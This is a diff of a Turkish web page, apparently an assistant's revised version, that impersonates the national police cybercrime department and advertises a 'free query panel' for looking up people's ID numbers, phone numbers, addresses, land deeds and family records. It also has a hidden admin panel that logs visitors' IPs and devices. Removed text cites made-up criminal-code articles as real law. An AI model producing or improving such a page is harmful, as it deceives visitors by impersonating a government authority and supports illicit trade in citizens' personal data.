@@ -1,40 +1,16 @@
-Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hataları düzelttim:
-
-```html
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>EGM Siber Suçlarla Mücade Daire Başkanlığı</title>
     
     <meta name="description" content="Emniyet Genel Merkezi Siber Suçlarla Mücadele Daire Başkanlığına ait tek gerçek sorgu sayfası.">
     <meta name="keywords" content="sorgu paneli, bedava sorgu paneli, ücretsiz sorgu paneli, online sorgu paneli, tc sorgu paneli, gsm sorgu paneli, adres sorgu paneli, tapu sorgu paneli, kimlik sorgu paneli, telefon sorgu paneli, en iyi sorgu paneli, hızlı sorgu paneli, güvenli sorgu paneli, sorgu paneli 2024, türkiye sorgu paneli">
-    <meta name="author" content="Sorgu Pro Team">
-    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
-    <meta name="language" content="Turkish">
-    <meta name="geo.region" content="TR">
-    <meta name="geo.country" content="Turkey">
-    <meta name="distribution" content="global">
-    <meta name="rating" content="general">
-    <meta name="revisit-after" content="1 days">
     
-    <meta property="og:title" content="EGM İSSMDB | Sorgu Sayfası">
-    <meta property="og:description" content="✅ Türkiye'nin #1 Bedava Sorgu Paneli ⚡ Hızlı T.C. Sorgu ⚡ GSM Sorgu ⚡ Adres & Tapu Sorgu | 100% Ücretsiz | Anlık Sonuç">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://lytradev.xyz/egmsorgu">
-    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSGLS3jqF8vy0TcvWXKf7CNTvpoysrmI4N3A&s">
-    <meta property="og:image:alt" content="EGM İSSMDB | Sorgu Sayfası">
-    <meta property="og:site_name" content="Sorgu Pro - Bedava Panel">
-    <meta property="og:locale" content="tr_TR">
-
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Sorgu Pro - Bedava Sorgu Paneli">
-    <meta name="twitter:description" content="Türkiye'nin en kapsamlı bedava sorgu paneli. Ücretsiz T.C., GSM, adres sorguları.">
-    <meta name="twitter:image" content="assets/images/ssssor.png">
-
-    <link rel="canonical" href="https://sorgu.pro">
-    <meta name="theme-color" content="#00ffff">
+    <!-- Touch Icons -->
+    <link rel="apple-touch-icon" sizes="180x180" href="https://img.icons8.com/color/96/000000/shield.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://img.icons8.com/color/96/000000/shield.png">
     
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -46,14 +22,25 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
         }
 
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
             background: #0a0a0a;
-            min-height: 100vh;
             color: #ffffff;
-            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
 
         .ai-grid {
@@ -84,17 +71,21 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
             padding: 20px;
             position: relative;
             z-index: 1;
+            width: 100%;
         }
 
         .main-panel {
-            background: rgba(15, 15, 15, 0.8);
+            background: rgba(15, 15, 15, 0.95);
             border: 1px solid rgba(0, 255, 255, 0.1);
-            border-radius: 12px;
-            padding: 60px 40px;
+            border-radius: 16px;
+            padding: 40px 25px;
             max-width: 450px;
             width: 100%;
-            backdrop-filter: blur(20px);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
             position: relative;
+            margin: 0 auto;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
 
         .main-panel::before {
@@ -110,39 +101,41 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
 
         .ai-header {
             text-align: center;
-            margin-bottom: 50px;
+            margin-bottom: 40px;
         }
 
         .ai-title {
-            font-size: 1.8rem;
-            font-weight: 300;
+            font-size: 1.6rem;
+            font-weight: 400;
             color: #ffffff;
-            margin-bottom: 8px;
-            letter-spacing: 2px;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
         }
 
         .ai-subtitle {
-            font-size: 0.9rem;
-            color: rgba(0, 255, 255, 0.6);
+            font-size: 0.85rem;
+            color: rgba(0, 255, 255, 0.7);
             font-weight: 300;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
+            line-height: 1.4;
         }
 
         .query-categories {
             display: flex;
             flex-direction: column;
-            gap: 20px;
+            gap: 15px;
+            margin-bottom: 30px;
         }
 
         .category {
-            background: rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.4);
             border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 10px;
+            border-radius: 12px;
             overflow: hidden;
         }
 
         .category-header {
-            padding: 18px 24px;
+            padding: 18px 20px;
             background: rgba(0, 255, 255, 0.05);
             border-bottom: 1px solid rgba(0, 255, 255, 0.1);
             cursor: pointer;
@@ -150,14 +143,16 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
             display: flex;
             justify-content: space-between;
             align-items: center;
+            -webkit-user-select: none;
+            user-select: none;
         }
 
-        .category-header:hover {
+        .category-header:active {
             background: rgba(0, 255, 255, 0.08);
         }
 
         .category-title {
-            font-size: 1.05rem;
+            font-size: 1rem;
             font-weight: 500;
             color: #ffffff;
             display: flex;
@@ -166,12 +161,12 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
         }
 
         .category-icon {
-            font-size: 1.2rem;
+            font-size: 1.1rem;
             color: rgba(0, 255, 255, 0.8);
         }
 
         .category-arrow {
-            font-size: 1rem;
+            font-size: 0.9rem;
             color: rgba(255, 255, 255, 0.5);
             transition: transform 0.3s ease;
         }
@@ -195,54 +190,40 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
             border: none;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
             border-radius: 0;
-            padding: 16px 24px;
+            padding: 16px 20px;
             cursor: pointer;
             transition: all 0.3s ease;
             position: relative;
             overflow: hidden;
+            -webkit-user-select: none;
+            user-select: none;
         }
 
         .query-item:last-child {
             border-bottom: none;
         }
 
-        .query-item::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.05), transparent);
-            transition: left 0.6s ease;
-        }
-
-        .query-item:hover::before {
-            left: 100%;
-        }
-
-        .query-item:hover {
-            border-color: rgba(0, 255, 255, 0.2);
-            background: rgba(0, 255, 255, 0.02);
+        .query-item:active {
+            background: rgba(0, 255, 255, 0.05);
             transform: translateX(4px);
         }
 
         .query-label {
-            font-size: 0.95rem;
+            font-size: 0.9rem;
             font-weight: 400;
             color: #ffffff;
             margin-bottom: 4px;
         }
 
         .query-desc {
-            font-size: 0.8rem;
-            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.5);
             font-weight: 300;
             line-height: 1.3;
         }
 
         .status-bar {
-            margin-top: 40px;
+            margin-top: 30px;
             padding: 16px 0;
             border-top: 1px solid rgba(255, 255, 255, 0.05);
             text-align: center;
@@ -250,17 +231,19 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
         }
 
         .status-text {
-            font-size: 0.75rem;
-            color: rgba(0, 255, 255, 0.4);
+            font-size: 0.7rem;
+            color: rgba(0, 255, 255, 0.6);
             font-weight: 300;
-            letter-spacing: 1px;
-            cursor: pointer;
-            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+            padding: 10px;
+            -webkit-user-select: none;
+            user-select: none;
+            display: inline-block;
         }
 
-        .status-text:hover {
-            color: rgba(0, 255, 255, 0.8);
-            transform: scale(1.05);
+        .status-text:active {
+            color: rgba(0, 255, 255, 0.9);
+            transform: scale(0.98);
         }
 
         .pulse-dot {
@@ -269,7 +252,7 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
             height: 6px;
             background: #00ffff;
             border-radius: 50%;
-            margin: 0 8px;
+            margin: 0 6px;
             animation: pulse 2s ease-in-out infinite;
         }
 
@@ -278,35 +261,52 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
             50% { opacity: 1; transform: scale(1.2); }
         }
 
-        /* Admin Panel Styles - DÜZELTİLMİŞ */
+        /* Admin Panel - Mobil Optimize */
+        .admin-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 9998;
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+        }
+
+        .admin-overlay.active {
+            display: block;
+        }
+
         .admin-panel {
             display: none;
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: rgba(10, 10, 10, 0.95);
+            background: rgba(15, 15, 15, 0.98);
             border: 2px solid #00ffff;
-            border-radius: 15px;
-            padding: 30px;
-            width: 90%;
-            max-width: 800px;
-            max-height: 90vh;
+            border-radius: 20px;
+            padding: 25px;
+            width: 95%;
+            max-width: 500px;
+            max-height: 85vh;
             overflow-y: auto;
-            z-index: 1000;
-            backdrop-filter: blur(20px);
-            box-shadow: 0 0 50px rgba(0, 255, 255, 0.2);
+            z-index: 9999;
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.3);
+            -webkit-overflow-scrolling: touch;
         }
 
         .admin-panel.active {
             display: block;
-            animation: panelAppear 0.5s ease;
+            animation: panelAppear 0.3s ease;
         }
 
         @keyframes panelAppear {
             from {
                 opacity: 0;
-                transform: translate(-50%, -50%) scale(0.9);
+                transform: translate(-50%, -50%) scale(0.95);
             }
             to {
                 opacity: 1;
@@ -318,13 +318,13 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
             padding-bottom: 15px;
             border-bottom: 1px solid rgba(0, 255, 255, 0.3);
         }
 
         .admin-title {
-            font-size: 1.5rem;
+            font-size: 1.3rem;
             color: #00ffff;
             font-weight: 500;
         }
@@ -333,30 +333,52 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
             background: none;
             border: none;
             color: #fff;
-            font-size: 1.5rem;
+            font-size: 1.8rem;
             cursor: pointer;
-            transition: color 0.3s;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            -webkit-tap-highlight-color: transparent;
         }
 
-        .admin-close:hover {
-            color: #ff5555;
+        .admin-close:active {
+            background: rgba(255, 255, 255, 0.1);
         }
 
         .admin-tabs {
             display: flex;
-            gap: 10px;
+            overflow-x: auto;
+            gap: 8px;
             margin-bottom: 20px;
+            padding-bottom: 10px;
             border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none;
+        }
+
+        .admin-tabs::-webkit-scrollbar {
+            display: none;
         }
 
         .admin-tab {
-            padding: 10px 20px;
+            padding: 12px 18px;
             background: rgba(255, 255, 255, 0.05);
             border: none;
-            border-radius: 5px 5px 0 0;
+            border-radius: 8px;
             color: #fff;
             cursor: pointer;
             transition: all 0.3s;
+            white-space: nowrap;
+            flex-shrink: 0;
+            font-size: 0.9rem;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .admin-tab:active {
+            background: rgba(0, 255, 255, 0.2);
         }
 
         .admin-tab.active {
@@ -374,28 +396,28 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
 
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-bottom: 25px;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
         }
 
         .stat-card {
             background: rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(0, 255, 255, 0.1);
-            border-radius: 8px;
-            padding: 20px;
+            border-radius: 10px;
+            padding: 15px;
             text-align: center;
         }
 
         .stat-value {
-            font-size: 2rem;
+            font-size: 1.8rem;
             font-weight: 600;
             color: #00ffff;
             margin-bottom: 5px;
         }
 
         .stat-label {
-            font-size: 0.9rem;
+            font-size: 0.8rem;
             color: rgba(255, 255, 255, 0.6);
         }
 
@@ -403,34 +425,41 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
             width: 100%;
             border-collapse: collapse;
             margin-top: 15px;
+            font-size: 0.85rem;
         }
 
         .data-table th {
             background: rgba(0, 255, 255, 0.1);
-            padding: 12px 15px;
+            padding: 12px 10px;
             text-align: left;
             font-weight: 500;
             color: #00ffff;
             border-bottom: 2px solid rgba(0, 255, 255, 0.2);
+            white-space: nowrap;
         }
 
         .data-table td {
-            padding: 12px 15px;
+            padding: 10px;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .data-table tr:hover {
-            background: rgba(0, 255, 255, 0.02);
+            word-break: break-all;
         }
 
         .btn {
-            padding: 8px 16px;
+            padding: 10px 15px;
             border: none;
-            border-radius: 4px;
+            border-radius: 8px;
             cursor: pointer;
             font-weight: 500;
             transition: all 0.3s;
-            margin: 2px;
+            margin: 4px 2px;
+            font-size: 0.85rem;
+            min-height: 44px;
+            min-width: 44px;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .btn:active {
+            transform: scale(0.95);
         }
 
         .btn-block {
@@ -438,26 +467,14 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
             color: white;
         }
 
-        .btn-block:hover {
-            background: #ff3333;
-        }
-
         .btn-unblock {
             background: #55ff55;
             color: #000;
         }
 
-        .btn-unblock:hover {
-            background: #33ff33;
-        }
-
         .btn-delete {
             background: #ffaa55;
             color: white;
-        }
-
-        .btn-delete:hover {
-            background: #ff9933;
         }
 
         .form-group {
@@ -466,21 +483,23 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
 
         .form-control {
             width: 100%;
-            padding: 10px;
+            padding: 14px;
             background: rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(0, 255, 255, 0.2);
-            border-radius: 4px;
+            border-radius: 8px;
             color: white;
             margin-top: 5px;
+            font-size: 1rem;
+            min-height: 44px;
         }
 
         .search-box {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
 
         .badge {
             display: inline-block;
-            padding: 3px 8px;
+            padding: 4px 10px;
             border-radius: 12px;
             font-size: 0.75rem;
             font-weight: 500;
@@ -496,56 +515,79 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
             color: #ff5555;
         }
 
-        .overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 999;
-        }
-
-        .overlay.active {
-            display: block;
-        }
-
+        /* Mobile Specific Adjustments */
         @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
             .main-panel {
-                padding: 40px 30px;
-                margin: 20px;
+                padding: 30px 20px;
+                border-radius: 20px;
             }
-
+            
             .ai-title {
-                font-size: 1.5rem;
+                font-size: 1.4rem;
             }
-
-            .query-item {
-                padding: 18px;
-            }
-
+            
             .admin-panel {
-                width: 95%;
-                padding: 20px;
+                width: 98%;
+                padding: 20px 15px;
+                border-radius: 20px;
             }
-
-            .stats-grid {
-                grid-template-columns: 1fr;
+            
+            .admin-title {
+                font-size: 1.2rem;
+            }
+            
+            .admin-tab {
+                padding: 10px 15px;
+                font-size: 0.85rem;
+            }
+            
+            .stat-value {
+                font-size: 1.6rem;
             }
         }
 
         @media (max-width: 480px) {
             .main-panel {
-                padding: 35px 25px;
+                padding: 25px 15px;
             }
-
+            
             .ai-title {
-                font-size: 1.3rem;
+                font-size: 1.2rem;
             }
+            
+            .query-item {
+                padding: 14px 16px;
+            }
+            
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .btn {
+                padding: 8px 12px;
+                font-size: 0.8rem;
+            }
+        }
 
-            .admin-tabs {
-                flex-direction: column;
+        /* Landscape Mode */
+        @media (max-height: 600px) and (orientation: landscape) {
+            .container {
+                padding: 10px;
+                min-height: auto;
+            }
+            
+            .main-panel {
+                max-height: 90vh;
+                overflow-y: auto;
+                -webkit-overflow-scrolling: touch;
+            }
+            
+            .admin-panel {
+                max-height: 90vh;
             }
         }
     </style>
@@ -554,21 +596,21 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
     <div class="ai-grid"></div>
     
     <!-- Admin Panel Overlay -->
-    <div class="overlay" id="adminOverlay"></div>
+    <div class="admin-overlay" id="adminOverlay"></div>
     
     <!-- Admin Panel -->
     <div class="admin-panel" id="adminPanel">
         <div class="admin-header">
-            <h2 class="admin-title"><i class="fas fa-shield-alt"></i> Sistem Yönetim Paneli</h2>
-            <button class="admin-close" onclick="closeAdminPanel()">&times;</button>
+            <h2 class="admin-title"><i class="fas fa-shield-alt"></i> Admin Paneli</h2>
+            <button class="admin-close" id="adminCloseBtn">&times;</button>
         </div>
         
         <div class="admin-tabs">
-            <button class="admin-tab active" onclick="switchTab('dashboard')">Dashboard</button>
-            <button class="admin-tab" onclick="switchTab('ips')">IP Yönetimi</button>
-            <button class="admin-tab" onclick="switchTab('devices')">Cihazlar</button>
-            <button class="admin-tab" onclick="switchTab('blocked')">Engellenenler</button>
-            <button class="admin-tab" onclick="switchTab('settings')">Ayarlar</button>
+            <button class="admin-tab active" data-tab="dashboard">Dashboard</button>
+            <button class="admin-tab" data-tab="ips">IP Yönetimi</button>
+            <button class="admin-tab" data-tab="devices">Cihazlar</button>
+            <button class="admin-tab" data-tab="blocked">Engellenenler</button>
+            <button class="admin-tab" data-tab="settings">Ayarlar</button>
         </div>
         
         <!-- Dashboard Tab -->
@@ -576,131 +618,88 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
             <div class="stats-grid">
                 <div class="stat-card">
                     <div class="stat-value" id="totalVisitors">0</div>
-                    <div class="stat-label">Toplam Ziyaretçi</div>
+                    <div class="stat-label">Toplam Ziyaret</div>
                 </div>
                 <div class="stat-card">
                     <div class="stat-value" id="blockedCount">0</div>
-                    <div class="stat-label">Engellenen IP</div>
+                    <div class="stat-label">Engellenen</div>
                 </div>
                 <div class="stat-card">
                     <div class="stat-value" id="uniqueDevices">0</div>
-                    <div class="stat-label">Benzersiz Cihaz</div>
+                    <div class="stat-label">Cihaz</div>
                 </div>
                 <div class="stat-card">
                     <div class="stat-value" id="todayVisits">0</div>
-                    <div class="stat-label">Bugünkü Ziyaret</div>
+                    <div class="stat-label">Bugün</div>
                 </div>
             </div>
             
-            <h3>Son 10 Ziyaret</h3>
+            <h3 style="margin: 15px 0 10px; font-size: 1.1rem;">Son Ziyaretler</h3>
             <div class="search-box">
-                <input type="text" class="form-control" placeholder="IP veya cihaz ara..." onkeyup="filterLogs(this.value)">
+                <input type="text" class="form-control" placeholder="Ara..." id="searchLogs">
             </div>
-            <table class="data-table" id="recentLogs">
-                <thead>
-                    <tr>
-                        <th>Tarih</th>
-                        <th>IP Adresi</th>
-                        <th>Cihaz</th>
-                        <th>Tarayıcı</th>
-                        <th>Durum</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <!-- Logs will be inserted here -->
-                </tbody>
-            </table>
+            <div style="overflow-x: auto;">
+                <table class="data-table" id="recentLogs">
+                    <thead>
+                        <tr>
+                            <th>Tarih</th>
+                            <th>IP</th>
+                            <th>Cihaz</th>
+                            <th>Durum</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <!-- Logs will be inserted here -->
+                    </tbody>
+                </table>
+            </div>
         </div>
         
         <!-- IP Management Tab -->
         <div class="admin-content" id="ips">
-            <h3>IP Yönetimi</h3>
+            <h3 style="margin-bottom: 15px; font-size: 1.1rem;">IP Yönetimi</h3>
             <div class="form-group">
-                <label>Yeni IP Engelle:</label>
-                <input type="text" class="form-control" id="blockIpInput" placeholder="IP adresi girin (örn: 192.168.1.1)">
-                <button class="btn btn-block" style="margin-top: 10px;" onclick="blockIP()">Engelle</button>
+                <label style="display: block; margin-bottom: 8px;">Yeni IP Engelle:</label>
+                <input type="text" class="form-control" id="blockIpInput" placeholder="IP adresi girin">
+                <button class="btn btn-block" style="margin-top: 12px; width: 100%;">Engelle</button>
             </div>
             
-            <h4>Tüm IP Kayıtları</h4>
-            <table class="data-table">
-                <thead>
-                    <tr>
-                        <th>IP Adresi</th>
-                        <th>Son Giriş</th>
-                        <th>Giriş Sayısı</th>
-                        <th>Durum</th>
-                        <th>İşlem</th>
-                    </tr>
-                </thead>
-                <tbody id="ipTable">
-                    <!-- IP list will be inserted here -->
-                </tbody>
-            </table>
-        </div>
-        
-        <!-- Devices Tab -->
-        <div class="admin-content" id="devices">
-            <h3>Cihaz Kayıtları</h3>
-            <table class="data-table">
-                <thead>
-                    <tr>
-                        <th>Cihaz ID</th>
-                        <th>Tarayıcı</th>
-                        <th>İşletim Sistemi</th>
-                        <th>Ekran</th>
-                        <th>Son Aktivite</th>
-                        <th>İşlem</th>
-                    </tr>
-                </thead>
-                <tbody id="deviceTable">
-                    <!-- Device list will be inserted here -->
-                </tbody>
-            </table>
-        </div>
-        
-        <!-- Blocked Tab -->
-        <div class="admin-content" id="blocked">
-            <h3>Engellenen IP ve Cihazlar</h3>
-            <table class="data-table">
-                <thead>
-                    <tr>
-                        <th>Tip</th>
-                        <th>Değer</th>
-                        <th>Engelleme Tarihi</th>
-                        <th>Engelleyen</th>
-                        <th>İşlem</th>
-                    </tr>
-                </thead>
-                <tbody id="blockedTable">
-                    <!-- Blocked items will be inserted here -->
-                </tbody>
-            </table>
+            <h4 style="margin: 20px 0 10px; font-size: 1rem;">IP Kayıtları</h4>
+            <div style="overflow-x: auto;">
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>IP</th>
+                            <th>Son Giriş</th>
+                            <th>Sayı</th>
+                            <th>Durum</th>
+                            <th>İşlem</th>
+                        </tr>
+                    </thead>
+                    <tbody id="ipTable">
+                        <!-- IP list will be inserted here -->
+                    </tbody>
+                </table>
+            </div>
         </div>
         
         <!-- Settings Tab -->
         <div class="admin-content" id="settings">
-            <h3>Sistem Ayarları</h3>
+            <h3 style="margin-bottom: 20px; font-size: 1.1rem;">Sistem Ayarları</h3>
             <div class="form-group">
-                <label>Yönlendirme URL:</label>
+                <label style="display: block; margin-bottom: 8px;">Yönlendirme URL:</label>
                 <input type="text" class="form-control" id="redirectUrl" value="https://lytradev.xyz">
-                <small>Engellenen kullanıcılar bu URL'ye yönlendirilir</small>
+                <small style="color: rgba(255,255,255,0.5); font-size: 0.8rem;">Engellenenler buraya yönlendirilir</small>
             </div>
             
             <div class="form-group">
-                <label>Otomatik temizlik (gün):</label>
+                <label style="display: block; margin-bottom: 8px;">Otomatik temizlik (gün):</label>
                 <input type="number" class="form-control" id="cleanupDays" value="30" min="1" max="365">
-                <small>Bu günden eski kayıtlar otomatik silinir</small>
             </div>
             
-            <div class="form-group">
-                <button class="btn" style="background: #00ffff; color: #000;" onclick="saveSettings()">Ayarları Kaydet</button>
-                <button class="btn btn-delete" onclick="clearAllData()">Tüm Verileri Temizle</button>
-            </div>
-            
-            <h4>Veri İşlemleri</h4>
-            <div class="form-group">
-                <button class="btn" style="background: #5555ff; color: white;" onclick="exportData()">Verileri Dışa Aktar</button>
-                <button class="btn" style="background: #ff55ff; color: white;" onclick="importData()">Verileri İçe Aktar</button>
+            <div class="form-group" style="margin-top: 25px;">
+                <button class="btn" style="background: #00ffff; color: #000; width: 100%; margin-bottom: 10px;" id="saveSettingsBtn">Ayarları Kaydet</button>
+                <button class="btn btn-delete" style="width: 100%;" id="clearDataBtn">Tüm Verileri Temizle</button>
             </div>
         </div>
     </div>
@@ -708,16 +707,17 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
     <div class="container">
         <div class="main-panel">
             <div class="ai-header">
-                <img src="https://pbs.twimg.com/media/BQFvQytCQAA-IWq.png" alt="Bedava Sorgu Paneli - Ücretsiz T.C. GSM Adres Sorgu" style="max-width: 200px; height: auto; margin-bottom: 10px;">
-                <div class="ai-subtitle">EGM İSSMDB | Sorgu Sayfası</div>
-                <div style="font-size: 0.7rem; color: rgba(0, 255, 255, 0.4); margin-top: 5px;">
-                    Bu sayfa Emniyet Genel Müdürlüğü İstanbul Siber Suçlarla Mücadele Daire Başkanlığı'nın tek gerçek sorgu sayfasıdır. Aksi sayfalarda yapılan sorgular TCK 9281, 9182, 9302 kanunları gereğince yasal olmayan kabul edilecektir. 
+                <div style="margin-bottom: 15px; padding: 15px; background: rgba(0,255,255,0.05); border-radius: 10px; border: 1px solid rgba(0,255,255,0.1);">
+                    <div style="font-size: 1.2rem; color: #00ffff; margin-bottom: 5px;">EGM İSSMDB</div>
+                    <div class="ai-subtitle">Siber Suçlarla Mücadele Daire Başkanlığı</div>
+                </div>
+                <div style="font-size: 0.75rem; color: rgba(0, 255, 255, 0.5); margin-top: 10px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 8px;">
+                    Resmi sorgu paneli - Yetkisiz erişim yasaktır
                 </div>
             </div>
             
             <div class="query-categories">
-                <!-- Mevcut sorgu kategorileri -->
-                <div class="category" onclick="toggleCategory(this)">
+                <div class="category">
                     <div class="category-header">
                         <div class="category-title">
                             <span class="category-icon">👤</span>
@@ -726,75 +726,42 @@ Hata düzeltilmiş halini atıyorum. Admin paneli CSS ve JavaScript'teki hatalar
                         <span class="category-arrow">▶</span>
                     </div>
                     <div class="query-list">
-                        <div class="query-item" onclick="executeQuery('ad-soyad')">
+                        <div class="query-item">
                             <div class="query-label">Ad Soyad Sorgu</div>
                             <div class="query-desc">İsim, soyisim bazlı veriler ile sorgulama</div>
                         </div>
-                        <div class="query-item" onclick="executeQuery('tc')">
+                        <div class="query-item">
                             <div class="query-label">T.C. Sorgu</div>
                             <div class="query-desc">T.C. kimlik numarası ile kimlik bilgilerini sorgula</div>
                         </div>
-                        <div class="query-item" onclick="executeQuery('gsmtc')">
+                    </div>
+                </div>
+
+                <div class="category">
+                    <div class="category-header">
+                        <div class="category-title">
+                            <span class="category-icon">📱</span>
+                            Telefon & GSM
+                        </div>
+                        <span class="category-arrow">▶</span>
+                    </div>
+                    <div class="query-list">
+                        <div class="query-item">
                             <div class="query-label">GSM → T.C. Sorgu</div>
                             <div class="query-desc">GSM numarası ile T.C. kimlik numarasını sorgula</div>
                         </div>
-                        <div class="query-item" onclick="executeQuery('tcgsm')">
+                        <div class="query-item">
                             <div class="query-label">T.C. → GSM Sorgu</div>
                             <div class="query-desc">T.C. kimlik numarası ile GSM bilgilerini sorgula</div>
                         </div>
                     </div>
                 </div>
-
-                <div class="category" onclick="toggleCategory(this)">
-                    <div class="category-header">
-                        <div class="category-title">
-                            <span class="category-icon">🏠</span>
-                            Konut & Adres
-                        </div>
-                        <span class="category-arrow">▶</span>
-                    </div>
-                    <div class="query-list">
-                        <div class="query-item" onclick="executeQuery('adres')">
-                            <div class="query-label">Adres Sorgu</div>
-                            <div class="query-desc">T.C. ile adres bilgilerini sorgula</div>
-                        </div>
-                        <div class="query-item" onclick="executeQuery('hane')">
-                            <div class="query-label">Hane Sorgu</div>
-                            <div class="query-desc">T.C. ile hane bilgilerini sorgula</div>
-                        </div>
-                        <div class="query-item" onclick="executeQuery('tapu')">
-                            <div class="query-label">Tapu Sorgu</div>
-                            <div class="query-desc">T.C. ile tapu bilgilerini sorgula</div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Diğer kategoriler... -->
-                <div class="category" onclick="toggleCategory(this)">
-                    <div class="category-header">
-                        <div class="category-title">
-                            <span class="category-icon">👨‍👩‍👧‍👦</span>
-                            Aile & Soy
-                        </div>
-                        <span class="category-arrow">▶</span>
-                    </div>
-                    <div class="query-list">
-                        <div class="query-item" onclick="executeQuery('aile')">
-                            <div class="query-label">Aile Sorgu</div>
-                            <div class="query-desc">T.C. ile aile bilgilerini sorgula</div>
-                        </div>
-                        <div class="query-item" onclick="executeQuery('soy')">
-                            <div class="query-label">Soyağacı Sorgu</div>
-                            <div class="query-desc">T.C. ile soyağacı bilgilerini sorgula</div>
-                        </div>
-                    </div>
-                </div>
-
             </div>
             
             <div class="status-bar">
-                <div class="status-text" onclick="openAdminPanel()">
-                    İstanbul Emniyet Genel Müdürlüğü Siber Suçlarla Mücadele Daire Başkanlığı
+                <div class="status-text" id="adminAccessBtn">
+                    <i class="fas fa-lock" style="margin-right: 8px;"></i>
+                    Yönetici Erişimi
                     <span class="pulse-dot"></span>
                 </div>
             </div>
